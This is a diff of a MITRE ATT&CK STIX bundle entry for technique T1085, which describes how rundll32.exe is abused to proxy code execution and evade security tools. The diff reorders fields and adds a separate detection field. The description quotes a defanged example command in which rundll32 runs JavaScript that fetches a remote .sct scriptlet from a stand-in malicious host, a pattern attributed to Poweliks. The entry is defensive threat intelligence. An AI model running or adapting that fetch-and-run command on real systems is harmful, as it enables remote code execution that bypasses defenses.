@@ -1,67 +1,69 @@
 {
+    "type": "bundle",
+    "id": "bundle--ccc1ca4f-e6d6-4b74-b72a-eff8428243de",
+    "spec_version": "2.0",
     "objects": [
         {
+            "id": "attack-pattern--62b8c999-dcc0-4755-bd69-09442d9359f5",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
             "name": "Rundll32",
-            "description": "The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.\n\nRundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\n\nRundll32 can also been used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)\n\nDetection: Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded.\n\nPlatforms: Windows\n\nData Sources: File monitoring, Binary file metadata, Process command-line parameters, Process monitoring\n\nDefense Bypassed: Anti-virus, Application whitelisting\n\nPermissions Required: User\n\nRemote Support: No\n\nContributors: Ricardo Dias, Casey Smith",
-            "kill_chain_phases": [
-                {
-                    "kill_chain_name": "mitre-attack",
-                    "phase_name": "defense-evasion"
-                },
-                {
-                    "kill_chain_name": "mitre-attack",
-                    "phase_name": "execution"
-                }
-            ],
+            "description": "The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.\n\nRundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\n\nRundll32 can also been used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)",
             "external_references": [
                 {
-                    "url": "https://attack.mitre.org/wiki/Technique/T1085",
-                    "source_name": "mitre-attack",
-                    "external_id": "T1085"
+                    "external_id": "T1085",
+                    "url": "https://attack.mitre.org/techniques/T1085",
+                    "source_name": "mitre-attack"
                 },
                 {
+                    "url": "https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf",
                     "description": "Merces, F. (2014). CPL Malware Malicious Control Panel Items. Retrieved November 1, 2017.",
-                    "source_name": "Trend Micro CPL",
-                    "url": "https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf"
+                    "source_name": "Trend Micro CPL"
                 },
                 {
+                    "url": "https://thisissecurity.stormshield.com/2014/08/20/poweliks-command-line-confusion/",
                     "description": "B. Ancel. (2014, August 20). Poweliks \u2013 Command Line Confusion. Retrieved March 5, 2018.",
-                    "source_name": "This is Security Command Line Confusion",
-                    "url": "https://thisissecurity.stormshield.com/2014/08/20/poweliks-command-line-confusion/"
+                    "source_name": "This is Security Command Line Confusion"
                 }
             ],
             "object_marking_refs": [
                 "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
             ],
-            "created": "2017-05-31T21:31:06.045Z",
-            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
-            "x_mitre_platforms": [
-                "Windows"
-            ],
+            "x_mitre_version": "1.0",
             "x_mitre_data_sources": [
                 "File monitoring",
-                "Binary file metadata",
+                "Process monitoring",
                 "Process command-line parameters",
-                "Process monitoring"
+                "Binary file metadata"
+            ],
+            "x_mitre_contributors": [
+                "Ricardo Dias",
+                "Casey Smith"
             ],
             "x_mitre_defense_bypassed": [
                 "Anti-virus",
                 "Application whitelisting"
             ],
+            "x_mitre_detection": "Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded.",
             "x_mitre_permissions_required": [
                 "User"
             ],
             "x_mitre_remote_support": false,
-            "x_mitre_contributors": [
-                "Ricardo Dias",
-                "Casey Smith"
+            "x_mitre_platforms": [
+                "Windows"
             ],
-            "id": "attack-pattern--62b8c999-dcc0-4755-bd69-09442d9359f5",
-            "modified": "2018-04-18T17:59:24.739Z",
-            "type": "attack-pattern"
+            "type": "attack-pattern",
+            "kill_chain_phases": [
+                {
+                    "phase_name": "defense-evasion",
+                    "kill_chain_name": "mitre-attack"
+                },
+                {
+                    "phase_name": "execution",
+                    "kill_chain_name": "mitre-attack"
+                }
+            ],
+            "modified": "2018-10-17T00:14:20.652Z",
+            "created": "2017-05-31T21:31:06.045Z"
         }
-    ],
-    "type": "bundle",
-    "id": "bundle--30641a21-eb30-4c03-b88b-d5ae1320fa28",
-    "spec_version": "2.0"
+    ]
 }
